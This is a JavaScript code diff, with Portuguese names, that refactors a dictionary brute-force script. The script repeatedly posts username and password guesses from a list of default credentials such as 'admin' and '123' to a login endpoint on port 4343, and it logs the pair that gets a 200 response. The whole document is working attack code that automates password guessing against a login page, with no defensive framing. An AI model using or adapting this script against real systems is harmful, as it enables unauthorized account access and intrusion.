@@ -1,5 +1,5 @@
 const dicionario = {
-    logins: ['adm', 'administrador', 'admin',],
+    logins: ['UsuarioX'],
     senhas: ['adm', '123', '1234', '12345', 'administrador', 'admin']
 };
 
@@ -11,8 +11,8 @@ const urlAlvo = `http://${ip}:4343/login`;
 
 let l = 0, s = 0;
 let count = 0;
-a();
-function a() {
+sendAjax();
+function sendAjax() {
     count++;
     data.login = dicionario.logins[l];
     data.senha = dicionario.senhas[s];
@@ -25,9 +25,10 @@ function a() {
         statusCode: {
             200: () => {
                 bad = false;
-                find.login = dicionario.logins[l];
-                find.senha = dicionario.senhas[s];
-                b();
+                let user = {};
+                user.login = dicionario.logins[l];
+                user.senha = dicionario.senhas[s];
+                endFB(user);
             },
             401: () => {
                 if (l++ > dicionario.logins.length) {
@@ -37,15 +38,15 @@ function a() {
                     }
                 }
                 if (l >= dicionario.logins.length && s >= dicionario.senhas.length) {
-                    b();
+                    endFB({user:"Não encontrado"});
                 } else {
-                    a();
+                    sendAjax();
                 }
             }
         }
     });
 }
 
-function b() {
-    console.log({ loginEncontrado: find });
+function endFB(login) {
+    console.log({ loginEncontrado: login });
 }
